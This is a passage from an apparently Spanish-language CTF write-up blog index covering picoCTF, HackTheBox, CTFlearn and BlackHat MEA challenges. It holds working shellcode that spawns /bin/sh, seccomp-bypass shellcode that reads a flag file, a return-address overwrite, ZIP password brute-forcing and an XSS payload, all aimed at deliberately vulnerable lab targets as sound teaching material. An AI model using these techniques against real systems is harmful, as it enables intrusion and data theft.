$al, $bh y $bl (fragmentos de los registro $eax y $ebx):\npush 16 # 6a 10 nop # 90 pop ecx # 59 =\u0026gt; $ecx = 16 xor eax, eax # 31 c0 =\u0026gt; $eax = 0x00000000 mov al, 0x68 # b0 68 =\u0026gt; $eax = 0x00000068 shl eax, ecx # d3 e0 =\u0026gt; $eax = 0x00680000 mov ah, 0x73 # b4 73 =\u0026gt; $eax = 0x00687300 mov al, 0x2f # b0 2f =\u0026gt; $eax = 0x0068732f (\"/sh\\0\") mov bh, 0x6e # b7 6e =\u0026gt; $ebx = 0x____6e__ mov bl, 0x69 # b3 69 =\u0026gt; $ebx = 0x____6e69 shl ebx, ecx # d3 e3 =\u0026gt; $ebx = 0x6e690000 mov bh, 0x62 # b7 62 =\u0026gt; $ebx = 0x6e696200 mov bl, 0x2f # b3 2f =\u0026gt; $ebx = 0x6e69622f (\"/bin\") push eax # 50 =\u0026gt; Push \"/sh\\0\" push ebx # 53 =\u0026gt; Push \"/bin\" xor ecx, ecx # 31 c9 =\u0026gt; $ecx = 0 xor edx, edx # 31 d2 =\u0026gt; $edx = 0 xor eax, eax # 31 c0 =\u0026gt; $eax = 0 mov al, 0x0b # b0 0b =\u0026gt; $eax = 0x0b mov ebx, esp # 89 e3 =\u0026gt; $ebx = *\"/bin/sh\\0\" int 0x80 # cd 80 =\u0026gt; execve  El código máquina generado solamente tiene 38 bytes.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/filtered-shellcode/","section":"ctf","summary":"picoCTF 2021. 160 puntos. Binario de 32 bits. Shellcode personalizado","time":5,"title":"filtered-shellcode"},{"contents":"Se nos proporciona un binario de 32 bits llamado EasyPass.exe que es un archivo Windows PE:\n$ file EasyPass.exe EasyPass.exe: PE32 executable (GUI) Intel 80386, for MS Windows  Si lo ejecutamos en una máquina Windows, nos preguntará por una contraseña:\nComo la contraseña será incorrecta, veremos un mensaje \u0026ldquo;Wrong Password!\u0026rdquo;:\nUn análisis de código estático con Ghidra no es útil. Por tanto, vamos a utilizar un depurador como x32dbg para depurar el binario. Una vez abierto, podemos buscar la cadena de texto anterior:\nY ahora ponemos un breakpoint en esa dirección (bueno, en la instrucción jne):\nY al ejecutar el programa de nuevo, veremos la contraseña esperada:\nPor lo que la flag es: HTB{fortran!}.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/reversing/find-the-easy-pass/","section":"ctf","summary":"Depuración con x32dbg","time":0,"title":"Find The Easy Pass"},{"contents":"Se nos proporciona un binario de 64 bits llamado fleet_management:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  Si lo abrimos en Ghidra, veremos esta función main:\nintmain() { setup(); fprintf(stdout, \"%s%sFleet Management System %s\\n\", \u0026amp;DAT_001023e5, \u0026amp;DAT_001020e9, \u0026amp;DAT_001023e0); fprintf(stdout, \"\\n%s[*] Loading . . .\\n%s\", \u0026amp;DAT_001020f1, \u0026amp;DAT_001020e9); sleep(2); menu(); return0; }  Está llamando a menu:\nvoidmenu() { longin_FS_OFFSET; undefined8 uVar1; charlocal_13 [3]; undefined8 canary; canary =*(undefined8 *) (in_FS_OFFSET +0x28); memset(local_13, 0, 3); do{ fwrite(\"\\n-_-_-_-_-_-_-_-_-_-_-_-_-\\n\", 1, 0x1b, stdout); fwrite(\"| |\\n\", 1, 0x1b, stdout); fwrite(\"| [1] View the Fleet |\\n\", 1, 0x1b, stdout); fwrite(\"| [2] Control Panel |\\n\", 1, 0x1b, stdout); fwrite(\"| [3] User Settings |\\n\", 1, 0x1b, stdout); fwrite(\"| [4] Exit |\\n\", 1, 0x1b, stdout); fwrite(\"| |\\n\", 1, 0x1b, stdout); fwrite(\"-_-_-_-_-_-_-_-_-_-_-_-_-\\n\", 1, 0x1a, stdout); fwrite(\"\\n[*] What do you want to do? \", 1, 0x1d, stdout); read(0, local_13, 2); switch(local_13[0]) { case'1': fprintf(stdout, \"\\n%s[*] Connecting to the Encrypted channel . . .\\n%s\", \u0026amp;DAT_001020f1, \u0026amp;DAT_001020e9); sleep(1); fprintf(stdout, \"\\n%s[*] Fetching Data . . .\\n%s\", \u0026amp;DAT_001020f1, \u0026amp;DAT_001020e9); sleep(1); uVar1 =0x10166a; fwrite(\"\\n=============================\\n\", 1, 0x1f, stdout); fprintf(stdout, \"| %sPDS Thanatos - %s[%sActive%s]%s|\\n\", \u0026amp;DAT_00102180, \u0026amp;DAT_00102178, \u0026amp;DAT_001020f1,\u0026amp;DAT_00102178,\u0026amp;DAT_001020e9, uVar1); fprintf(stdout, \"| %sCS Meteor - %s[%sActive%s]%s|\\n\", \u0026amp;DAT_00102180, \u0026amp;DAT_00102178, \u0026amp;DAT_001020f1,\u0026amp;DAT_00102178,\u0026amp;DAT_001020e9); fprintf(stdout, \"| %sLWS Proximo - %s[%sActive%s]%s|\\n\", \u0026amp;DAT_00102180, \u0026amp;DAT_00102178, \u0026amp;DAT_001020f1, \u0026amp;DAT_00102178, \u0026amp;DAT_001020e9); fprintf(stdout, \"| %sSTS Goliath - %s[%sInactive%s]%s|\\n\", \u0026amp;DAT_00102180, \u0026amp;DAT_00102178, \u0026amp;DAT_00102211, \u0026amp;DAT_00102178, \u0026amp;DAT_001020e9); fwrite(\"=============================\\n\", 1, 0x1e, stdout); fwrite(\"\\nKey:\\n\", 1, 6, stdout); fprintf(stdout, \"%sPDS: Planet Destroyer Ship\\n\", \u0026amp;DAT_00102180); fwrite(\"CS: Combat Spaceship\\n\", 1, 0x15, stdout); fwrite(\"LWS: Light Weight Spaceship\\n\", 1, 0x1c, stdout); fprintf(stdout, \"STS: Space Transportation Ship%s\\n\", \u0026amp;DAT_001020e9); break; case'2': fprintf(stdout, \"\\n%s[*] Authenticating . . .\\n%s\", \u0026amp;DAT_001020f1, \u0026amp;DAT_001020e9); sleep(1); fprintf(stdout, \"\\n%s[!] Error: You are not member of an authorized group.\\n%s\", \u0026amp;DAT_00102211, \u0026amp;DAT_001020e9); break; case'3': fprintf(stdout, \"\\n%s[!] Error: You should authenticate first.\\n%s\", \u0026amp;DAT_00102211, \u0026amp;DAT_001020e9); break; case'4': fprintf(stdout, \"\\n[*] Bye! %s\\n\", \u0026amp;DAT_00102380); /* WARNING: Subroutine does not return */ exit(0); case'9': beta_feature(); default: fprintf(stdout, \"\\n%s[!] Error: Invalid Option.\\n%s\", \u0026amp;DAT_00102211, \u0026amp;DAT_001020e9); } } while(true); }  Es una función bastante larga, pero la única opción que parece interesante es beta_feature (opción 9):\nvoidbeta_feature() { code *__buf;  __buf =(code *) malloc(0x3c); mprotect((void*) ((ulong) __buf \u0026amp;0xfffffffffffff000), 0x3c, 7); read(0, __buf, 0x3c); skid_check(); (*__buf)(); }  Básicamente, tenemos la oportunidad de introducir instrucciones en código máquina para que se ejecuten. Podemos introducir hasta 0x3c (60) bytes. Sin embargo, estamos limitados por skid_function, que implementa reglas seccomp para permitir instrucciones syscall específicas:\nvoidskid_check() { undefined8 uVar1;  uVar1 =seccomp_init(0); seccomp_rule_add(uVar1, 0x7fff0000, 0x3c, 0); seccomp_rule_add(uVar1, 0x7fff0000, 0xe7, 0); seccomp_rule_add(uVar1, 0x7fff0000, 0x101, 0); seccomp_rule_add(uVar1, 0x7fff0000, 0x28, 0); seccomp_rule_add(uVar1, 0x7fff0000, 0xf, 0); seccomp_load(uVar1); }  Para enumerar estas reglas seccomp, podemos usar seccomp-tools:\n$ seccomp-tools dump ./fleet_management 🛰 Fleet Management System 📡 [*] Loading . . . -_-_-_-_-_-_-_-_-_-_-_-_- | | | [1] View the Fleet | | [2] Control Panel | | [3] User Settings | | [4] Exit | | | -_-_-_-_-_-_-_-_-_-_-_-_- [*] What do you want to do? 9 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x06 0xffffffff if (A != 0xffffffff) goto 0011 0005: 0x15 0x04 0x00 0x0000000f if (A == rt_sigreturn) goto 0010 0006: 0x15 0x03 0x00 0x00000028 if (A == sendfile) goto 0010 0007: 0x15 0x02 0x00 0x0000003c if (A == exit) goto 0010 0008: 0x15 0x01 0x00 0x000000e7 if (A == exit_group) goto 0010 0009: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL  Entonces, nos permiten usar sys_rt_sigreturn, sys_sendfile, sys_exit, sys_exit_group y sys_openat. Existen varias páginas web en las que se listan todas las instrucciones syscall de Linux x86_64 con los parámetros y registros necesarios. Por ejemplo, esta.\nCon las instrucciones syscall permitidas, podemos abrir el archivo de la flag (flag.txt) con sys_openat y enviarlo al descriptor de archivo stdout con sys_sendflie. Adicionalmente, podemos salir con sys_exit.\nEntonces, sys_openat necesita la siguiente configuración de registros:\n $rax = 0x101 $rdi tiene un descriptor de archivo de directorio $rsi tiene un puntero al nombre del archivo $rdx tiene unas flags $rcx tiene el modo de operación (este se puede omitir)  Específicamente, podemos mirar en man7.org y aprender más sobre el significado de los parámetros:\nintopenat(intdirfd, constchar*pathname, intflags);  Existe un alias para el descriptor de archivo de directorio llamado AT_FDCWD que representa el directorio de trabajo actual (más información en stackoverflow.com). Además, abriremos el archivo como solo lectura (O_RDONLY).\nUna vez que tengamos sys_openat configurado, recibiremos el descriptor de archivo del archivo de la flag como valor de retorno en $rax. Aquí será cuando usemos sys_sendfile (en verdad, sys_sendfile64):\n $rax = 0x28 $rdi tiene el descriptor de archivo de salida (1, que representa stdout) $rsi tiene el descriptor de archivo de entrada (el que devuelve sys_openat) $rdx tiene un offset desde el cual empezar a leer (0) $rcx tiene el tamaó en bytes a enviar (por ejemplo, 100)  ssize_tsendfile(intout_fd, intin_fd, off_t*offset, size_tcount);  Para gente que nunca ha escrito en ensamblador, puede ser útil escribir un programa en C con la configuración anterior, compilarlo y analizar el código ensamblador generado:\n#include\u0026lt;fcntl.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;sys/sendfile.h\u0026gt; voidmain() { intfd; fd =openat(AT_FDCWD, \"flag.txt\", O_RDONLY); sendfile(1, fd, 0, 100); exit(0); }  $ gcc test.c -O3 -o test; ./test HTB{f4k3_fl4g_f0r_t3st1ng}  Ese es el código ensamblador generado (optimizado debido a la opción -O3 de gcc):\n$ objdump -M intel --disassemble=main test test: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000010a0 \u0026lt;main\u0026gt;: 10a0: f3 0f 1e fa endbr64 10a4: 50 push rax 10a5: 58 pop rax 10a6: 31 d2 xor edx,edx 10a8: 48 8d 35 55 0f 00 00 lea rsi,[rip+0xf55] # 2004 \u0026lt;_IO_stdin_used+0x4\u0026gt; 10af: bf 9c ff ff ff mov edi,0xffffff9c 10b4: 31 c0 xor eax,eax 10b6: 48 83 ec 08 sub rsp,0x8 10ba: e8 b1 ff ff ff call 1070 \u0026lt;openat@plt\u0026gt; 10bf: bf 01 00 00 00 mov edi,0x1 10c4: b9 64 00 00 00 mov ecx,0x64 10c9: 31 d2 xor edx,edx 10cb: 89 c6 mov esi,eax 10cd: e8 ae ff ff ff call 1080 \u0026lt;sendfile@plt\u0026gt; 10d2: 31 ff xor edi,edi 10d4: e8 b7 ff ff ff call 1090 \u0026lt;exit@plt\u0026gt; Disassembly of section .fini:  Esto está bien, pero ahora hay que hacer lo mismo con instrucciones syscall:\nxor rdx, rdx push rdx mov rsi, 'flag.txt' # as hexadecimal number push rsi mov rsi, rsp xor rdi, rdi sub rdi, 100 mov rax, 0x101 syscall mov rcx, 0x64 mov esi, eax xor rdi, rdi inc edi mov al, 0x28 syscall mov al, 0x3c syscall  Nótese cómo puse $rsi como puntero a \u0026quot;flag.txt\\0\u0026quot;, y también cómo $rdi = -100 (AT_FDCWD). También, optimicé el uso de los registros para que el shellcode generado fuera más corto.\nSi introducimos el shellcode anterior en el programa fleet_management, obtendremos la flag:\n$ python3 solve.py 165.22.125.212:30121 [*] './fleet_management' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 165.22.125.212 on port 30121: Done [*] Shellcode length: 0x38 [+] HTB{sh3llc0d3_45_4_b4ckd00r} [*] Closed connection to 165.22.125.212 port 30121  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/pwn/fleet-management/","section":"ctf","summary":"Binario de 64 bits. Reglas seccomp. Shellcode personalizado","time":5,"title":"Fleet Management"},{"contents":"Se nos proporciona un binario de 64 bits llamado main:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  Si lo abrimos en Ghidra, veremos las siguientes funciones:\nvoidbad_function() { execve(\"/bin/sh\", NULL, NULL); } voidvuln() { chardata[10]; read(0, data, 170); } intmain() { setvbuf(stderr, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); vuln(); return0; }  Existe una vulnerabilidad de Buffer Overflow. Vemos que data es una cadena de caracteres de 10 bytes, y el programa lee hasta 170 bytes. Por tanto, podemos sobrescribir valores en la pila (por ejemplo, la dirección de retorno).\nLa idea es sobrescribir la dirección de retorno con la dirección de bad_function. No obstante, PIE está habilitado, por lo que las direcciones del binario son aleatorias.\nDe momento, vamos a usar GDB para encontrar el offset que necesitamos para sobrescribir la dirección de retorno:\n$ gdb -q main Reading symbols from main... (No debugging symbols found in main) gef➤ pattern create 30 [+] Generating a pattern of 30 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./main aaaaaaaabaaaaaaacaaaaaaadaaaaa Program received signal SIGSEGV, Segmentation fault. 0x00005555555551b2 in vuln ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 18 (little-endian search) likely [+] Found at offset 23 (big-endian search)  Vale, necesitamos 18 bytes para llegar a la posición donde se guarda la dirección de retorno. Vamos a poner un breakpoint justo aquí y a ejecutar el programa otra vez para introducir exactamente 18 bytes (17 más un salto de línea):\ngef➤ break Breakpoint 1 at 0x5555555551b2 gef➤ run Starting program: ./main AAAAAAAAAAAAAAAAA Breakpoint 1, 0x00005555555551b2 in vuln ()  gef➤ x/10gx $rsp - 0x10 0x7fffffffe668: 0x4141414141414141 0x0a41414141414141 0x7fffffffe678: 0x0000555555555201 0x0000000000000000 0x7fffffffe688: 0x00007ffff7de1083 0x00007ffff7ffc620 0x7fffffffe698: 0x00007fffffffe778 0x0000000100000000 0x7fffffffe6a8: 0x00005555555551b3 0x0000555555555230 gef➤ x $rsp 0x7fffffffe678: 0x0000555555555201 gef➤ backtrace #0 0x00005555555551b2 in vuln () #1 0x0000555555555201 in main () Backtrace stopped: Cannot access memory at address 0xa41414141414149 gef➤ p bad_function $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x555555555208 \u0026lt;bad_function\u0026gt;  Si miramos con atentamente, veremos que la dirección de retorno y la dirección de bad_function difieren en el último byte, por lo que podemos desbordar únicamente este byte y redirigir la ejecución a bad_function.\nEsto se puede hacer de forma manual:\n$ (echo -ne 'AAAAAAAAAAAAAAAAAA\\x08'; cat) | ./main ls main solve.py  O mediante un script en Python para conectarse a la instancia remota:\n$ python3 solve.py blackhat2-7c9ff8336e7deb83a4583a4529a7c0a8-0.chals.bh.ctf.sa [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to blackhat2-7c9ff8336e7deb83a4583a4529a7c0a8-0.chals.bh.ctf.sa on port 443: Done [*] Switching to interactive mode $ cat flag.txt BlackHatMEA{96:21:368fd8bb8dffb88a9690546fb5d3ee9f27464b6c}  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/other/fno-stack-protector/","section":"ctf","summary":"BlackHat MEA CTF 2022. Binario de 64 bits. Buffer Overflow. Control del flujo de ejecución del programa","time":2,"title":"fno-stack-protector"},{"contents":"Se nos pide encontrar la flag en esta imagen:\nSin embargo, la flag no está visible en la propia imagen ni oculta en su contenido. En cambio, podemos encontrar la flag en su contenido en crudo.\nPara extraer los caracteres imprimibles de la imagen podemos utilizar strings y filtrar por CTFlearn encadenando el comando anterior con grep:\n$ strings 95f6edfb66ef42d774a5a34581f19052.jpg | grep CTFlearn CTFlearn{wow!_data_is_cool}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/ctflearn/forensics/forensics-101/","section":"ctf","summary":"Caracteres imprimibles en archivos","time":0,"title":"Forensics 101"},{"contents":"Se nos proporciona un archivo ZIP llamado fsociety.zip:\n$ unzip -v fsociety.zip Archive: fsociety.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 729 Defl:N 186 75% 08-15-2017 17:44 e126a116 sshcreds_datacenter.txt -------- ------- --- ------- 729 186 75% 1 file  Vemos que está protegido con contraseña:\n$ unzip fsociety.zip Archive: fsociety.zip [fsociety.zip] sshcreds_datacenter.txt password:  Por tanto, podemos probar a realizar un ataque de fuerza bruta usando rockyou.txt y fcrackzip:\n$ fcrackzip -uDp $WORDLISTS/rockyou.txt fsociety.zip PASSWORD FOUND!!!!: pw == justdoit  Y tenemos la contraseña, vamos a descomprimir el archivo ZIP y a leer sshcreds_datacenter.txt:\n$ unzip fsociety.zip Archive: fsociety.zip [fsociety.zip] sshcreds_datacenter.txt password: inflating: sshcreds_datacenter.txt $ cat sshcreds_datacenter.txt ***************************************************************************************** Encrypted SSH credentials to access Blume ctOS : MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= *****************************************************************************************  La cadena de texto larga parece codificada en Base64, vamos a decodificarla:\n$ echo MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= | base64 -d 01101001 01100110 01011111 01111001 00110000 01110101 01011111 01100011 01000000 01101110 01011111 00100100 01101101 00110011 01101100 01101100 01011111 01110111 01101000 01000000 01110100 01011111 01110100 01101000 00110011 01011111 01110010 00110000 01100011 01101011 01011111 01101001 01110011 01011111 01100011 00110000 00110000 01101011 01101001 01101110 01100111  Ahora tenemos binario\u0026hellip; Vamos a juntar todos los términos y a transformarlo a un número hexadecimal con Python:\n$ echo MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= | base64 -d | tr -d ' ' 0110100101100110010111110111100100110000011101010101111101100011010000000110111001011111001001000110110100110011011011000110110001011111011101110110100001000000011101000101111101110100011010000011001101011111011100100011000001100011011010110101111101101001011100110101111101100011001100000011000001101011011010010110111001100111 $ python3 -c \"print(hex(0b$(echo MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= | base64 -d | tr -d ' ')))\" 0x69665f7930755f63406e5f246d336c6c5f776840745f7468335f7230636b5f69735f6330306b696e67  Parecen bytes imprimibles en ASCII, por lo que vamos a transformar el número hexadecimal a bytes:\n$ python3 -c \"print(bytes.fromhex(hex(0b$(echo MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= | base64 -d | tr -d ' '))[2:]))\" b'if_y0u_c@n_$m3ll_wh@t_th3_r0ck_is_c00king'  Y la flag es: HTB{if_y0u_c@n_$m3ll_wh@t_th3_r0ck_is_c00king}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/fs0ciety/","section":"ctf","summary":"Fuerza bruta sobre la contraseña de un archivo ZIP. Codificación Base64, binaria y hexadecimal","time":1,"title":"fs0ciety"},{"contents":"Se nos proporciona esta página web:\nAl final de la página podemos introducir texto:\nSi ponemos algunos datos, vemos un mensaje:\nNo obstante, la página pide que mostremos un alert(). Esto se suele usar como prueba de concepto para un ataque de Cross-Site Scripting (XSS). Uno de los payloads de XSS más sencillos es:\n\u0026lt;imgsrc=xonerror=alert(1)\u0026gt;  Si lo usamos, veremos la flag en el alert (HTB{p0p..p0p..p0p...alert(1337)}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/full-stack-conf/","section":"ctf","summary":"Cross-Site Scripting","time":0,"title":"Full Stack Conf"},{"contents":"Se nos proporciona una página web que muestra dos colores de fondo:\nEl botón rojo utiliza una petición GET y el azul usa una petición POST. Pero no vemos nada más.\nComo el nombre del reto incluye HEAD, vamos a ver si qué pasa si hacemos petición HEAD con curl:\n$ curl -I mercury.picoctf.net:47967 HTTP/1.1 200 OK flag: picoCTF{r3j3ct_th3_du4l1ty_cca66bd3} Content-type: text/html; charset=UTF-8  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/picoctf/web-exploitation/get-ahead/","section":"ctf","summary":"picoCTF 2021. 20 puntos. Método HEAD","time":0,"title":"GET aHEAD"},{"contents":"Se nos proporciona un archivo ZIP que contiene un fichero flag.txt:\n$ ls flag.txt $ cat flag.txt CTFlearn{REDACTED}  Pero esta no es la flag. Mirando un poco más en la carpeta, descubrimos un directorio .git, por lo que estamos en un repositorio de Git (también, el nombre del reto nos lo indica):\n$ ls -a . .. .git flag.txt  Podemos utilizar git log para mostrar commits anteriores (es decir, confirmaciones que son como guardados del proyecto a lo largo del tiempo):\n$ git log commit d10f77c4e766705ab36c7f31dc47b0c5056666bb (HEAD -\u0026gt; master) Author: LaScalaLuke \u0026lt;lascala.luke@gmail.com\u0026gt; Date: Sun Oct 30 14:33:18 2016 -0400 Edited files commit 195dd65b9f5130d5f8a435c5995159d4d760741b Author: LaScalaLuke \u0026lt;lascala.luke@gmail.com\u0026gt; Date: Sun Oct 30 14:32:44 2016 -0400 Edited files commit 6e824db5ef3b0fa2eb2350f63a9f0fdd9cc7b0bf Author: LaScalaLuke \u0026lt;lascala.luke@gmail.com\u0026gt; Date: Sun Oct 30 14:32:11 2016 -0400 edited files  Con git diff podremos mostrar las differencias entre dos commits (tenemos que indicar algumos de los primeros caracteres de los identificadores del commit). Este es interesante:\n$ git diff 6e824db5 195dd65b diff --git a/flag.txt b/flag.txt index c5250d0..8684e68 100644 --- a/flag.txt +++ b/flag.txt @@ -1 +1 @@ -CTFlearn{REDACTED} +CTFlearn{protect_your_git}  Y aquí tenemos la flag.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/ctflearn/forensics/git-is-good/","section":"ctf","summary":"Commits en Git","time":0,"title":"Git Is Good"},{"contents":"Se nos proporciona una imagen JPEG llamada garden.jpg:\nEl archivo se reconoce correctamente como imagen JPEG:\n$ file garden.jpg garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, components 3  Sin embargo, si mostramos las cadenas de caracteres imprimibles en el contenido del archivo, obtendremos la flag (se puede indicar la longitud de la cadena a mostrar):\n$ strings -50 garden.jpg Here is a flag \"picoCTF{more_than_m33ts_the_3y3eBdBd2cc}\"  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/picoctf/forensics/glory-of-the-garden/","section":"ctf","summary":"picoCTF 2019. 50 puntos. Caracteres imprimibles en archivos","time":0,"title":"Glory of the Garden"},{"contents":"Tenemos esta página web:\nEn la parte de abajo se indica el uso de gobuster con un diccionario de rutas llamado dirb/common.txt:\nComo el reto sugiere, vamos a usar gobuster con dirb/common.txt:\n$ gobuster dir -u https://gobustme.ctflearn.com -w $WORDLISTS/dirb/common.txt -q -r /call (Status: 200) [Size: 42] /carpet (Status: 200) [Size: 69] /flag (Status: 200) [Size: 15] /hide (Status: 200) [Size: 65] /index.html (Status: 200) [Size: 2712] /sex (Status: 200) [Size: 58] /shadow (Status: 200) [Size: 68] /skin (Status: 200) [Size: 120]  Perfecto, vamos a /flag para conseguir la flag:\n$ curl https://gobustme.ctflearn.com/flag/ No, too easy :)  Hmmm, entonces tendrá que estar en /hide:\n$ curl https://gobustme.ctflearn.com/hide/ It was well hidden isn't it? CTFlearn{gh0sbu5t3rs_4ever} \u0026amp;#128123  Solo por curiosidad, estas eran las otras rutas:\n$ curl https://gobustme.ctflearn.com/call/ Who you gonna call? Ghostbusters! \u0026amp;#128123 $ curl https://gobustme.ctflearn.com/carpet/ My sheet is dirty, do you mind if I use your carpet instead? \u0026amp;#128123 $ curl https://gobustme.ctflearn.com/sex/ Sex? I am 900 years old, I am too old for this... \u0026amp;#128123 $ curl https://gobustme.ctflearn.com/shadow/ I am following everywhere you go, I am your shadow... boo! \u0026amp;#128123; $ curl https://gobustme.ctflearn.com/skin/ \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; We are ghosts, do you really think we have skin? \u0026amp;#128123; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/ctflearn/web/gobustme/","section":"ctf","summary":"Fuzzing de rutas","time":0,"title":"Gobustme 👻"},{"contents":"Se nos proporciona un binario estático de 64 bits llamado vuln\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir un número, compararlo con otro aleatorio y si es el mismo, solicitar un nombre para mostrar un mensaje:\n#include \u0026lt;stdio.h\u0026gt; 